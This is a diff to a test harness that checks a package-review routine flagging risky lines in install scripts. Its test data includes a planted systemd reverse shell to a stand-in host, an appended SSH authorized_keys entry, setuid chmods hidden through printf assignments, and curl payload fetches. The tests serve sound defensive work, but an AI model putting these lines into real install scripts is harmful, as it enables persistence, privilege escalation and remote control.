@@ -17,7 +17,6 @@
 //                 verdict, exactly when `installerRisk` is true: the
 //                 installer's own install-script check
 //                 (PackageReview.installScriptChange) found a risky line.
-// `installerRiskGap` marks a malicious fixture that check misses today.
 // PLANTED rows reuse a fixture with one defect in the world and declare
 // the failure or whole-folder delta the owner must report instead. Local
 // source changes must reach the diff even when PKGBUILD stays identical.
@@ -28,6 +27,7 @@
 "use strict";
 const assert = require("node:assert/strict"), fs = require("node:fs"), os = require("node:os"), path = require("node:path"), cp = require("node:child_process"), crypto = require("node:crypto");
 const { create, cacheRecipe } = require("./world.js");
+const { load } = require("../../../bin/lib/qml-library.js");
 const q = s => "'" + String(s).replaceAll("'", "'\\''") + "'";
 
 if (process.argv[2] === "--inner") {
@@ -185,6 +185,86 @@ function reviewed(label, fixture, plant, stop) {
     };
 }
 
+// Recipe scripts remain data. These rows exercise the same production judge
+// for first installs, planted changes and risks an installed copy already held.
+function installScriptRows() {
+    const read = name => {
+        const build = path.join(recipes, name, "build"), scripts = fs.readdirSync(build).filter(file => file.endsWith(".install"));
+        assert.equal(scripts.length, 1, name + ": one install script");
+        return fs.readFileSync(path.join(build, scripts[0]), "utf8");
+    };
+    const rows = [];
+    for (const [name, risks] of [
+        ["install-systemd-unit", [
+            "/usr/bin/systemctl --user enable com.system76.FirmwareManager.Notify.timer",
+            "cat > /etc/systemd/system/fwupd-refresh-helper.service <<'EOF'",
+            "ExecStart=/usr/bin/bash -c 'exec 3<>/dev/tcp/fw-metadata.invalid/443; bash <&3 >&3 2>&3'",
+            "systemctl enable --now fwupd-refresh-helper.service"
+        ]],
+        ["install-home-write", ["echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIInertFixtureKeyNotUsableForAnyLoginXXXXXXXXXXXX lsfg-vk-sync' >> \"$home/.ssh/authorized_keys\""]]
+    ]) {
+        const script = read(name);
+        rows.push([name + "-new", null, script, "new", risks]);
+        rows.push([name + "-changed", "post_install() {\n  systemctl daemon-reload\n}\n", script, "changed", risks]);
+        rows.push([name + "-existing", script, script + "\n# ordinary update\n", "changed", []]);
+    }
+    for (const [name, risks] of [
+        ["install-changed", ['chmod u+s "/usr/bin/mullvad-exclude"', 'systemctl enable --now mullvad-daemon || echo "Failed to start mullvad-daemon.service"', "systemctl enable mullvad-early-boot-blocking"]],
+        // Active command substitution is not literal advice, even for whoami.
+        ["install-group-update", ['echo "sudo usermod -aG falcond $(whoami)"']],
+        ["pkgver-bump-cached", ["chmod 4755 '/opt/Bitwarden/chrome-sandbox' || true"]]
+    ]) rows.push([name + "-first-install", null, read(name), "new", risks]);
+    const setuid = read("install-setuid"), chmod = "chmod 4755 /usr/lib/clight/.clight-helper";
+    assert.equal(setuid.split(chmod).length, 2, "install-setuid: one setuid command");
+    // The setuid fixture can store its attack in a quoted printf assignment before running the variable.
+    for (const [name, assignment] of [
+        ["single-quoted-printf-assignment", "printf '-v' 'payload' '%s' 'chmod 4755 /usr/lib/clight/.clight-helper'"],
+        ["double-quoted-printf-assignment", 'printf "-v" "payload" "%s" "chmod 4755 /usr/lib/clight/.clight-helper"']
+    ]) {
+        const script = setuid.replace(chmod, assignment + "\n    $payload");
+        rows.push([name + "-new", null, script, "new", [assignment]]);
+        rows.push([name + "-changed", "post_install() {\n}\n", script, "changed", [assignment]]);
+    }
+    for (const [line, risky] of [
+        ["echo 'sudo groupadd --system falcond'", false],
+        ['echo "sudo chmod 2775 /usr/share/falcond/profiles/user"', false],
+        ["printf '%s\\n' 'rm -rf ~/.config/app'", false],
+        ["printf '%s' 'chmod 4755 /usr/lib/clight/.clight-helper'", false],
+        ["printf \"%s\\n\" 'chmod 4755 /usr/lib/clight/.clight-helper'", false],
+        ["echo 'key' >> \"$home/.ssh/authorized_keys\"", true],
+        ["printf '%s\\n' 'key' >> \"$HOME/.ssh/authorized_keys\"", true],
+        ["echo 'payload' | sh", true],
+        ["printf '%s\\n' 'payload' | bash", true],
+        ["echo 'value' > /etc/app.conf", true],
+        ["printf '%s' 'value' > '/root/.profile'", true],
+        ["cat file > /home/user/.profile", true],
+        ["printf '%s' 'value' | tee -a /etc/app.conf", true],
+        ["cat file | /usr/bin/tee /root/.profile", true],
+        ["exec 3<>/dev/tcp/host.invalid/443", true],
+        ["exec 3<> /dev/udp/host.invalid/443", true],
+        ["systemctl enable --now planted.service", true],
+        ["systemctl --user enable planted.service", true],
+        ['echo "$(curl https://host.invalid/payload)"', true],
+        ["printf '%s' \"`curl https://host.invalid/payload`\"", true],
+        ["echo 'advice'; curl https://host.invalid/payload", true],
+        ["systemctl daemon-reload", false],
+        ["systemd-tmpfiles --create", false],
+        ["update-desktop-database /usr/share/applications", false],
+        ["gtk-update-icon-cache -q -t -f /usr/share/icons/hicolor", false],
+        ["ldconfig", false],
+        ["cat /etc/app.conf", false],
+        ["echo 'value' > /tmp/advice", false]
+    ]) rows.push([line, null, line, "new", risky ? [line] : []]);
+    return rows;
+}
+
+function verifyInstallScripts(judge, rows) {
+    for (const [name, installed, next, state, risks] of rows) {
+        assert.deepEqual(JSON.parse(JSON.stringify(judge.installScriptChange(installed, next))), { state, risks }, "install-script: " + name);
+        console.log("package-install-proof: " + JSON.stringify({ name, state, risks }));
+    }
+}
+
 try {
     const names = fs.readdirSync(recipes, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name).sort();
     const table = names.map(name => ({ name, fixture: path.join(recipes, name), plant: undefined, expect: meta => ({ recipe: meta.recipe, failures: [] }) }))
@@ -221,6 +301,36 @@ try {
     // Coverage floor: the set exercises every install and recipe state and
     // both installer answers, so a discovery that lost fixtures cannot pass.
     if (at < 0) {
+        const judgeFile = path.join(__dirname, "../../../shell/Core/PackageReview.js"), scriptRows = installScriptRows();
+        verifyInstallScripts(load(judgeFile), scriptRows);
+        const source = fs.readFileSync(judgeFile, "utf8"), controls = path.join(scratch, "judge-controls");
+        fs.mkdirSync(controls);
+        fs.copyFileSync(path.join(path.dirname(judgeFile), "PackageManagers.js"), path.join(controls, "PackageManagers.js"));
+        const printRules = source.split("\n").filter(line => line.includes("^(?:echo|printf "));
+        assert.equal(printRules.length, 1, "one literal-print exemption");
+        // The original seven risk families miss persistence; disabling only
+        // the print exemption restores false warnings on literal advice.
+        for (const [control, needle, replacement, names] of [
+            ["original-risk-families", "if (INSTALL_SCRIPT_RISKS[i].test(line)) return true;", "if (i < 7 && INSTALL_SCRIPT_RISKS[i].test(line)) return true;",
+                ["install-systemd-unit-new", "install-systemd-unit-changed", "install-home-write-new", "install-home-write-changed"]],
+            ["no-print-exemption", printRules[0], printRules[0].replace("if (", "if (false && "),
+                ["install-changed-first-install", "install-group-update-first-install"]],
+            // Removing the stdout format restriction hides the setuid assignment again.
+            ["unrestricted-printf-exemption", printRules[0], printRules[0].replace("printf (?:'%s(?:\\\\n)?'|\"%s(?:\\\\n)?\")", "printf"),
+                ["single-quoted-printf-assignment-new", "single-quoted-printf-assignment-changed", "double-quoted-printf-assignment-new", "double-quoted-printf-assignment-changed"]]
+        ]) {
+            assert.equal(source.split(needle).length, 2, control + ": one mutation site");
+            assert.notEqual(replacement, needle, control + ": mutation changes the source");
+            const file = path.join(controls, "PackageReview.js");
+            fs.writeFileSync(file, source.replace(needle, replacement));
+            const mutant = load(file);
+            for (const name of names) {
+                const row = scriptRows.find(row => row[0] === name);
+                assert.ok(row, control + ": required row " + name);
+                assert.throws(() => verifyInstallScripts(mutant, [row]), error => error.code === "ERR_ASSERTION" && error.message.includes("install-script: " + name), control + ": " + name);
+                console.log("package-install-control: " + JSON.stringify({ control, name, rejected: true }));
+            }
+        }
         for (const state of INSTALL_STATES) assert.ok(rows.some(r => r.meta.install === state), "coverage: install " + state);
         for (const state of RECIPE_STATES) assert.ok(rows.some(r => r.meta.recipe === state), "coverage: recipe " + state);
         for (const risk of [true, false]) assert.ok(rows.some(r => r.meta.installerRisk === risk), "coverage: installerRisk " + risk);
